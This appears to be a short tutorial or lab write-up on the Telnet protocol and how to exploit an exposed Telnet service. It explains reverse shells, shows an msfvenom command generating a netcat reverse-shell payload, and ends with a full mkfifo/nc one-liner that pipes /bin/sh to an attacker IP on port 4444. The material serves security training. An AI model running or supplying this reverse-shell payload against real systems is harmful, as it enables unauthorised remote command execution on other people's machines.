Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.  

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.

The user connects to the server by using the Telnet protocol, which means entering **"telnet"** into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt.

```sh
telnet Ip Port
```

#### Exploiting Telnet

It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.

A **"shell"** can simply be described as a piece of code or program which can be used to gain code or command execution on a device.

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

Connect via Telnet

On attacker machine

```sh
sudo tcpdump ip proto \\icmp -i tun0
```


This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

On victim machine 

```sh
.RUN ping -c 1 IPof Attacker
```


```sh
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```


-p = payload

lhost = our local host IP address 

lport = the port to listen on 

R = export the payload in raw format


Run the command generated by msfvenom on the target machine telnet session

```sh
.RUN mkfifo /tmp/zjvvjvz; nc 10.17.80.81 4444 0</tmp/zjvvjvz | /bin/sh >/tmp/zjvvjvz 2>&1; rm /tmp/zjvvjvz
```
